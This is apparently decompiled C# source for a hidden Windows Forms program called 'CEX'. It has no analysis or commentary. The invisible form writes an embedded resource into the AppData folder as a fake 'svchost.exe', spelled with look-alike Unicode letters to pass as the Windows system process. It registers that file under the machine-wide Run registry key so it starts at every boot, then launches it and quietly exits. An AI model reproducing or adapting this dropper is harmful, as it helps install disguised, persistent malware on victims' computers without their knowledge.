using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using CEX.Properties;
using Microsoft.Win32;

namespace CEX;

public class Form1 : Form
{
	private IContainer components = null;

	private Timer timer1;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(Color.White);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		timer1.Start();
	}

	public static void ExportFile(byte[] resource, string fileName)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath))
		{
			Directory.CreateDirectory(folderPath);
		}
		try
		{
			using BinaryWriter binaryWriter = new BinaryWriter(File.Open(fileName, FileMode.Create));
			binaryWriter.Write(resource);
			binaryWriter.Close();
		}
		catch
		{
		}
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = fileName;
			process.Start();
		}
		catch
		{
		}
		Application.Exit();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = "svchοst";
		try
		{
			File.Delete(folderPath + "\\svchοst.exe");
		}
		catch
		{
		}
		try
		{
			File.Delete(folderPath + "\\svchᴏst.exe");
		}
		catch
		{
		}
		if (File.Exists(folderPath + "\\" + text + ".exe"))
		{
			text = "svchᴏst";
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			try
			{
				registryKey.DeleteValue("svchοst.exe");
			}
			catch
			{
			}
			try
			{
				registryKey.DeleteValue("svchᴏst.exe");
			}
			catch
			{
			}
			try
			{
				registryKey.SetValue(text + ".exe", folderPath + "\\" + text + ".exe");
			}
			catch
			{
			}
			registryKey.Close();
		}
		catch
		{
		}
		ExportFile(Resources.scssv, folderPath + "\\" + text + ".exe");
		timer1.Stop();
	}
}
